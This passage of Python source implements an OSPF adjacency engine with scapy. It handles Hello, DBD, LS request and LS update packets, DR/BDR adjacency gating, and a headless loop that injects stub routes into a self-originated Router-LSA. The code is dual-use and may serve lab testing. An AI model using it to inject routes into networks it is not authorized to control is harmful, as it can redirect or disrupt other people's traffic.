            f"Interface {context['interface_name']} changed IPv4 address {previous_ip} -> {current_ip}. "
            "Refreshing self-originated Router-LSA."
        )
    else:
        reason = (
            f"Interface {context['interface_name']} changed IPv4 netmask {previous_mask} -> {current_mask}. "
            "Refreshing self-originated Router-LSA."
        )
    reset_adjacency_state(context, reason)
    return True


def show_neighbors(context):
    with context["lock"]:
        lines = [
            format_neighbor_status(neighbor)
            for neighbor in sorted(context["neighbors"].values(), key=lambda neighbor: neighbor["router_id"])
        ]
    if not lines:
        log_message("[STATUS] No OSPF neighbors discovered yet.")
        return
    for line in lines:
        log_message(line)


def update_full_adjacency_gate(context):
    ready_message = None
    with context["lock"]:
        has_dr = context["designated_router"] != "0.0.0.0"
        if has_dr:
            # Broadcast network: require the elected DR (and BDR if present) to be FULL.
            expected_peer_ips = [
                peer_ip
                for peer_ip in {context["designated_router"], context["backup_designated_router"]}
                if peer_ip != "0.0.0.0"
            ]
            neighbors_by_ip = {
                neighbor["ip_address"]: neighbor
                for neighbor in context["neighbors"].values()
                if is_dr_or_bdr_neighbor(neighbor)
            }
            everyone_full = bool(expected_peer_ips) and all(
                neighbors_by_ip.get(peer_ip, {}).get("state") == FULL
                for peer_ip in expected_peer_ips
            )
        else:
            # Point-to-point or pre-election: any FULL neighbor suffices.
            everyone_full = any(
                neighbor["state"] == FULL
                for neighbor in context["neighbors"].values()
            )
        if everyone_full:
            if not context["adjacency_ready_event"].is_set():
                context["adjacency_ready_event"].set()
                ready_message = "[MENU] FULL adjacency is ready. Type 'help' to view the available menu commands."
        else:
            context["adjacency_ready_event"].clear()
            context["menu_suppressed"] = False
    if ready_message:
        show_neighbors(context)
        log_message(ready_message)


# Adjacency forms in protocol order before any manual route advertisement is allowed.
def transition_neighbor(context, neighbor, new_state):
    neighbor["state"] = new_state
    if new_state == FULL:
        state_full(neighbor)


def state_down(context, neighbor):
    if neighbor["state"] == DOWN:
        transition_neighbor(context, neighbor, INIT)


def state_init(context, neighbor, hello_packet):
    if neighbor["state"] == INIT and context["router_id"] in (hello_packet.neighbors or []):
        transition_neighbor(context, neighbor, TWO_WAY)


def state_two_way(context, neighbor, packet, hello_packet):
    if neighbor["state"] != TWO_WAY:
        return
    # On broadcast networks, only form full adjacency with the DR/BDR.
    # On point-to-point networks (DR = 0.0.0.0), form adjacency with every neighbor.
    if context["designated_router"] != "0.0.0.0" and not is_dr_or_bdr_neighbor(neighbor):
        return
    transition_neighbor(context, neighbor, EXSTART)
    neighbor["database_sequence"] = INITIAL_DBD_SEQ
    neighbor["is_master"] = True
    send_packet(
        context,
        build_dbd(
            context,
            neighbor,
            is_initial_packet=True,
            has_more_packets=True,
            is_master_packet=True,
            sequence_number=neighbor["database_sequence"],
        ),
        destination=neighbor["ip_address"],
    )


def state_exstart(context, neighbor, router_id, master_bit, sequence_number):
    if neighbor["state"] != EXSTART:
        return False
    try:
        neighbor_is_master = int(ipaddress.IPv4Address(router_id)) > int(ipaddress.IPv4Address(context["router_id"]))
    except ValueError:
        neighbor_is_master = False
    if neighbor_is_master:
        neighbor["is_master"] = False
        neighbor["database_sequence"] = sequence_number
        transition_neighbor(context, neighbor, EXCHANGE)
        send_lsdb_summary(context, neighbor)
    elif not master_bit and sequence_number == neighbor["database_sequence"]:
        transition_neighbor(context, neighbor, EXCHANGE)
        send_lsdb_summary(context, neighbor)
    return True


def state_exchange(context, neighbor, packet, more_bit):
    peer_seq = packet[OSPF_DBDesc].ddseq
    if neighbor["state"] != EXCHANGE:
        if peer_seq == neighbor["last_peer_seq_in"] and neighbor["last_sent_dbd"] is not None:
            send_packet(context, neighbor["last_sent_dbd"], destination=neighbor["ip_address"])
            return True
        return False
    if peer_seq == neighbor["last_peer_seq_in"]:
        if neighbor["last_sent_dbd"] is not None:
            send_packet(context, neighbor["last_sent_dbd"], destination=neighbor["ip_address"])
        return True
    neighbor["last_peer_seq_in"] = peer_seq

    neighbor["requested_lsas"] = collect_unknown_lsas(context, packet)
    if not neighbor["is_master"]:
        neighbor["database_sequence"] = peer_seq
        dbd = build_dbd(context, neighbor, is_master_packet=False, sequence_number=neighbor["database_sequence"])
        neighbor["last_sent_dbd"] = dbd
        send_packet(context, dbd, destination=neighbor["ip_address"])
    if not more_bit:
        if neighbor["requested_lsas"]:
            transition_neighbor(context, neighbor, LOADING)
            ls_request_packet = build_header(context, 3)
            for lsa_type, lsa_id, adv_router in neighbor["requested_lsas"]:
                ls_request_packet = ls_request_packet / OSPF_LSReq(type=lsa_type, id=lsa_id, adrouter=adv_router)
            send_packet(context, ls_request_packet, destination=neighbor["ip_address"])
        else:
            transition_neighbor(context, neighbor, FULL)
        return True
    if neighbor["is_master"]:
        neighbor["database_sequence"] += 1
    dbd = build_dbd(context, neighbor, is_master_packet=neighbor["is_master"], sequence_number=neighbor["database_sequence"])
    neighbor["last_sent_dbd"] = dbd
    send_packet(context, dbd, destination=neighbor["ip_address"])
    return True


def state_loading(context, neighbor, packet):
    if neighbor["state"] != LOADING:
        return None
    neighbor["mac_address"] = packet[Ether].src
    neighbor["requested_lsas"].clear()
    transition_neighbor(context, neighbor, FULL)
    refresh_local_router_lsa(context)
    self_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
    if self_lsa is None:
        self_lsa = build_router_lsa(context)
    return self_lsa


def state_full(neighbor):
    log_message(format_neighbor_status(neighbor))


def collect_unknown_lsas(context, packet):
    requested_lsas = []
    lsa_layer = packet[OSPF_DBDesc].payload
    while lsa_layer and lsa_layer.name != "NoPayload":
        if not hasattr(lsa_layer, "adrouter"):
            lsa_layer = lsa_layer.payload
            continue
        lsa_type = getattr(lsa_layer, "type", 1)
        lsa_id = getattr(lsa_layer, "id", "0.0.0.0")
        advertising_router = lsa_layer.adrouter
        local_lsa = find_lsa(context, lsa_type, lsa_id, advertising_router)
        remote_sequence = getattr(lsa_layer, "seq", 0)
        if local_lsa is None or getattr(local_lsa, "seq", 0) < remote_sequence:
            requested_lsas.append((lsa_type, lsa_id, advertising_router))
        lsa_layer = lsa_layer.payload
    return requested_lsas

def send_lsdb_summary(context, neighbor):
    refresh_local_router_lsa(context)
    if neighbor["is_master"]:
        neighbor["database_sequence"] += 1
    lsa_packets = local_lsdb_entries(context)
    dbd = build_dbd(
        context,
        neighbor,
        is_master_packet=neighbor["is_master"],
        sequence_number=neighbor["database_sequence"],
        lsa_headers=[OSPF_LSA_Hdr(bytes(lsa_packet)[:20]) for lsa_packet in lsa_packets],
    )
    neighbor["last_sent_dbd"] = dbd
    send_packet(context, dbd, destination=neighbor["ip_address"])


def handle_hello(context, packet):
    ospf_header = packet[OSPF_Hdr]
    hello_packet = packet[OSPF_Hello]
    router_id = ospf_header.src
    if router_id == context["router_id"]:
        return

    with context["lock"]:
        neighbor = context["neighbors"].setdefault(router_id, make_neighbor(router_id, packet[IP].src))
        neighbor["ip_address"] = packet[IP].src
        neighbor["mac_address"] = packet[Ether].src
        neighbor["last_seen"] = time.time()
        neighbor["priority"] = hello_packet.prio
        neighbor["designated_router"] = hello_packet.router
        neighbor["backup_designated_router"] = hello_packet.backup
        if hello_packet.router != "0.0.0.0":
            context["designated_router"] = hello_packet.router
        if hello_packet.backup != "0.0.0.0":
            context["backup_designated_router"] = hello_packet.backup
        state_down(context, neighbor)
        state_init(context, neighbor, hello_packet)
        state_two_way(context, neighbor, packet, hello_packet)

    send_packet(context, build_hello(context))


def handle_dbd(context, packet):
    ospf_header = packet[OSPF_Hdr]
    database_description = packet[OSPF_DBDesc]
    router_id = ospf_header.src

    with context["lock"]:
        neighbor = context["neighbors"].get(router_id)
        if not neighbor or neighbor["state"] not in DBD_READY_STATES:
            return
        neighbor["mac_address"] = packet[Ether].src

        flags = database_description.dbdescr
        more_bit = flags & 0x02
        master_bit = flags & 0x01
        sequence_number = database_description.ddseq

        if state_exstart(context, neighbor, router_id, master_bit, sequence_number):
            return
        state_exchange(context, neighbor, packet, more_bit)


def handle_lsupd(context, packet):
    router_id = packet[OSPF_Hdr].src
    lsa_list = getattr(packet[OSPF_LSUpd], "lsalist", []) if packet.haslayer(OSPF_LSUpd) else []
    if lsa_list:
        fight_back_lsa = None
        with context["lock"]:
            for lsa_packet in lsa_list:
                if (
                    getattr(lsa_packet, "type", None) == 1
                    and getattr(lsa_packet, "id", None) == context["router_id"]
                    and getattr(lsa_packet, "adrouter", None) == context["router_id"]
                    and should_fight_back_self_lsa(context, lsa_packet)
                ):
                    if fight_back_lsa is None or getattr(lsa_packet, "seq", BASE_LSA_SEQUENCE - 1) > getattr(fight_back_lsa, "seq", BASE_LSA_SEQUENCE - 1):
                        fight_back_lsa = lsa_packet.copy()
                upsert_lsa(context, lsa_packet)
            refresh_local_router_lsa(context)
        send_packet(
            context,
            build_header(context, 5) / OSPF_LSAck(lsaheaders=[OSPF_LSA_Hdr(bytes(lsa_packet)[:20]) for lsa_packet in lsa_list]),
        )
        if fight_back_lsa is not None:
            reorigin_self_router_lsa(
                context,
                sequence_number=max(getattr(fight_back_lsa, "seq", BASE_LSA_SEQUENCE - 1) + 1, BASE_LSA_SEQUENCE),
            )

    self_lsa = None
    with context["lock"]:
        neighbor = context["neighbors"].get(router_id)
        if not neighbor:
            return
        self_lsa = state_loading(context, neighbor, packet)
    if self_lsa is not None:
        send_packet(context, build_ls_update(context, [self_lsa]), destination=ALL_DR_MULTICAST)


def handle_lsreq(context, packet):
    with context["lock"]:
        refresh_local_router_lsa(context)
        neighbor = context["neighbors"].get(packet[OSPF_Hdr].src)
        if neighbor:
            neighbor["mac_address"] = packet[Ether].src
        requested_lsa_packets = []
        request_layer = packet[OSPF_LSReq]
        while request_layer and request_layer.name != "NoPayload":
            if hasattr(request_layer, "adrouter"):
                local_lsa = find_lsa(context, request_layer.type, request_layer.id, request_layer.adrouter)
                if local_lsa is not None:
                    requested_lsa_packets.append(local_lsa.copy())
            request_layer = request_layer.payload
    send_packet(context, build_ls_update(context, requested_lsa_packets), destination=packet[IP].src)


def dispatch_packet(context, packet):
    if not packet.haslayer(OSPF_Hdr):
        return
    if packet[OSPF_Hdr].area != context["area_id"]:
        return
    if packet.haslayer(IP) and packet[IP].src == context["source_ip"] and packet[OSPF_Hdr].src == context["router_id"]:
        return
    ospf_packet_type = packet[OSPF_Hdr].type
    if ospf_packet_type == 1:
        handle_hello(context, packet)
    elif ospf_packet_type == 2:
        handle_dbd(context, packet)
    elif ospf_packet_type == 3:
        handle_lsreq(context, packet)
    elif ospf_packet_type == 4:
        handle_lsupd(context, packet)


# ── Headless engine (embedded in main.py) ────────────────────────────────────

def run_engine_headless(context):
    """Run the OSPF Hello loop without an interactive console.

    Designed to be started in a daemon thread by main.py so the adjacency
    engine shares the same process and context object.  The caller accesses
    context directly for menu operations (show neighbours, inject routes, etc.)
    and must call withdraw_injected_routes(context) + context["stop_event"].set()
    in its teardown path.
    """
    ensure_ospf_raw_socket(context)
    threading.Thread(
        target=sniff,
        kwargs=dict(
            iface=context["interface_name"],
            filter=OSPF_SNIFF_FILTER,
            prn=lambda packet: dispatch_packet(context, packet),
            store=0,
        ),
        daemon=True,
    ).start()
    log_message(f"[OSPF] Headless engine started on {context['interface_name']}")
    log_message("[OSPF] Sending Hellos — use the debug menu for OSPF control.")

    while not context["stop_event"].is_set():
        if not refresh_runtime_source_ip(context):
            update_full_adjacency_gate(context)
            time.sleep(context["hello_interval"])
            continue
        send_packet(context, build_hello(context))

        with context["lock"]:
            expired = [
                (router_id, neighbor)
                for router_id, neighbor in context["neighbors"].items()
                if time.time() - neighbor["last_seen"] > context["dead_interval"]
            ]
            lost_full_neighbor = context["adjacency_ready_event"].is_set() and any(
                neighbor["state"] == FULL and is_dr_or_bdr_neighbor(neighbor)
                for _, neighbor in expired
            )
            for router_id, _neighbor in expired:
                del context["neighbors"][router_id]
        if lost_full_neighbor:
            log_message("[OSPF] FULL adjacency lost — route injection paused.")
        for router_id, _neighbor in expired:
            log_message(f"[OSPF] Dead: {router_id} expired.")

        update_full_adjacency_gate(context)
        maybe_add_auto_route(context)
        time.sleep(context["hello_interval"])

    log_message("[OSPF] Headless engine stopped.")


def add_route_interactive(context):
    """Prompt for network/mask/metric and inject a stub into the Router-LSA."""
    prompt_and_add_router_stub_route(context, input)


# ── Integration helpers (called by main.py) ──────────────────────────────────

OSPF_FULL_WAIT_TIMEOUT = 300




